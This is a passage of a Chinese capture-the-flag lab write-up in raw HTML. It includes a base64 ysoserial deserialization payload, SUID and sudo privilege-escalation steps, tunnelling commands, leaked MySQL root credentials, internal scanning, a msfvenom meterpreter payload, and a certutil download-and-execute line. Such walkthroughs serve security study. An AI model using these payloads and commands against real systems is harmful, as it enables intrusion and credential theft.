AkAAAAWAAIAAAAOAV8AHwAAAAAADgFgAO8AAQASAAAACAADAJcAmQCVACkAUQBtAAIABwAAAhcAAwAJAAAAyirBAGiZAAoqwABopwAHKrYBcDoEAToFGQQ6BhkFxwBkGQbGAF8sxwBDGQa2AXQ6BwM2CBUIGQe+ogAuGQcVCDK2AXcrtgF6mQAZGQcVCDK2AX6+mgANGQcVCDI6BacACYQIAaf/0KcADBkGKyy2AYA6Baf/qToHGQa2AYI6Bqf/nRkFxwAMuwCXWSu3AYS/GQUEtgGGKsEAaJkAGhkFAS22AYiwOge7AYpZGQe2AY23AY+/GQUqLbYBkbA6B7sBilkZB7YBk7cBlb8AAwAlAHIAdQCXAJwAowCkAJkAswC6ALsAmQADAAgAAABuABsAAACPABQAkAAXAJIAGwCTACUAlQApAJcAMACYADsAmQBWAJoAXQCbAGAAmABmAJ4AaQCfAHIAowB1AKEAdwCiAH4AowCBAKUAhgCmAI8AqACVAKkAnACrAKQArACmAK0AswCxALsAsgC9ALMACQAAAHoADAAzADMBYwEaAAgAMAA2AWQBZQAHAHcABwCiAWYABwCmAA0AogFnAAcAvQANAKIBZwAHAAAAygFDAB8AAAAAAMoBYADvAAEAAADKAWgBaQACAAAAygFqAWsAAwAUALYAoAChAAQAFwCzAWwAnwAFABsArwFtAKEABgA+AAAALwAODkMHAGj+AAgHAGgHAMYHAGj9ABcHAW4BLPkABQIIQgcAlwsNVAcAmQ5HBwCZABIAAAAIAAMAlwCVAJkAAHVxAH4AHwAAAenK/rq+AAAANAAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEALEx5c29zZXJpYWwvZ2FkZ2V0L3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAqeXNvc2VyaWFsL2dhZGdldC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAmeXNvc2VyaWFsL2dhZGdldC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAADhAA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAIVFpZQ1VHTFhwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA==
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>链接上去&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/4.png"
width="733"
height="780"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/4_hu_fa15691f75565e69.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/4_hu_32fb0242226e2796.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="93"
data-flex-basis="225px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/5.png"
width="733"
height="780"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/5_hu_7135ea3e8ce5b9e4.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/5_hu_d35144d5e90b5f2b.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="93"
data-flex-basis="225px"
>&lt;/p>
&lt;p>权限不够，最近出了一个sudo提权的漏洞， &lt;a class="link" href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/" target="_blank" rel="noopener"
>https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/&lt;/a> 成功得到提权拿到flag1，或者是suid提权&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -perm -u&lt;span class="o">=&lt;/span>s -type f 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cmp /flag.txt /dev/zero -b -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>搭建代理&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ./proxy -selfcert -laddr &lt;span class="s2">&amp;#34;0.0.0.0:10001&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nohup ./agent -bind 0.0.0.0:10010 &amp;gt; agent.log 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect_agent --ip 39.98.124.212:10010
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">interface_list
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">session
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">autoroute
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nohup ./gost -L&lt;span class="o">=&lt;/span>socks://:1080 &amp;gt; gost.log 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看是否开启&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ss -luntp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2
&lt;/h2>&lt;p>找到刚才的外网服务的jar包，反编译，获得mysql的用户名和密码&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/6.png"
width="993"
height="420"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/6_hu_8c27ec6e4cd5dcf.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/6_hu_9d3a8a4f65a97901.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="236"
data-flex-basis="567px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">THYMELEAF&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ThymeleafAutoConfiguration&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">cache&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">check&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">template&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">check&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">template&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">location&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">enabled&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">UTF&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">8&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">excluded&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">view&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">names&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">mode&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">HTML5&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">prefix&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">classpath&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">templates&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">thymeleaf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">suffix&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">html&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">8080&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">datasource&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">driver&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="kd">class&lt;/span>&lt;span class="err">-&lt;/span>&lt;span class="nc">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">cj&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">jdbc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">Driver&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">datasource&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">jdbc&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//172.16.52.45:3306/maildb?characterEncoding=utf-8&amp;amp;useUnicode=true&amp;amp;serverTimezone=UTC&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">datasource&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">spring&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">datasource&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">password&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">b8ds&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">l3v&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">B&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>看这台机器的IP只看到了一个网段，但是这个网段只有一台机器，&lt;code>netstat -an&lt;/code>查看网络连接情况&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/7.png"
width="771"
height="534"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/7_hu_fdbece58d4140346.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/7_hu_90c6838218834e6c.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="144"
data-flex-basis="346px"
>&lt;/p>
&lt;p>发现还有这个网段&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mail-svc@webserver:/tmp$ ./fscan -h 172.16.34.5/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___ _
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / _ &lt;span class="se">\ &lt;/span> ___ ___ _ __ __ _ ___&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> __
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / /_&lt;span class="se">\/&lt;/span>____/ __&lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>__/ _&lt;span class="sb">`&lt;/span> &lt;span class="p">|&lt;/span>/ __&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/ /
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/ /_&lt;span class="se">\\&lt;/span>_____&lt;span class="se">\_&lt;/span>_ &lt;span class="se">\ &lt;/span>&lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">(&lt;/span>__&lt;span class="p">|&lt;/span> &amp;lt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">\_&lt;/span>___/ &lt;span class="p">|&lt;/span>___/&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> &lt;span class="se">\_&lt;/span>_,_&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>__&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>&lt;span class="se">\_\ &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fscan version: 1.8.4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start infoscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">trying RunIcmp2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The current user permissions unable to send icmp packets
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start ping
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.16.34.5 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.16.34.23 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Icmp alive hosts len is: &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.23:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.5:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.23:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.23:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.5:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.5:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.16.34.5:88 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> alive ports len is: &lt;span class="m">7&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start vulscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.16.34.5 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> DC:AOSELUAUTO&lt;span class="se">\A&lt;/span>SLSRVAD05
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.16.34.23 AOSELUAUTO&lt;span class="se">\A&lt;/span>SLSRVFS02
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.16.34.23
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>ASLSRVFS02
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.16.34.23
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.16.34.5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>ASLSRVAD05
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.16.34.5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">已完成 7/7
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 扫描结束,耗时: 8.095804082s
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>接着找到了Mysql&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/8.png"
width="747"
height="267"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/8_hu_3774fda03d46d265.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/8_hu_86d0cfd8c60ec06.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="279"
data-flex-basis="671px"
>&lt;/p>
&lt;p>MDUT链接上去&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/9.png"
width="1105"
height="936"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/9_hu_541b806ddb6071e.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/9_hu_d704f87db29fd142.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="118"
data-flex-basis="283px"
>&lt;/p>
&lt;p>UDF提权之后仍然不是system权限，看到有&lt;strong>SeImpersonatePrivilege&lt;/strong>可以利用，准备上线msf，现在生成&lt;code>bind.exe&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/x64/meterpreter/bind_tcp &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> -f exe &amp;gt; bind.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>到入口机，再用sqlserver下载执行&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nohup python3 -m http.server &lt;span class="m">9999&lt;/span> &amp;gt; agent.log 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">certutil -urlcache -split -f http://172.16.53.30:9999/bind.exe C:&lt;span class="se">\\&lt;/span>Users&lt;span class="se">\\&lt;/span>public&lt;span class="se">\\&lt;/span>bind.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\\&lt;/span>Users&lt;span class="se">\\&lt;/span>public&lt;span class="se">\\&lt;/span>bind.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>链接上去，提权，hashdump&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
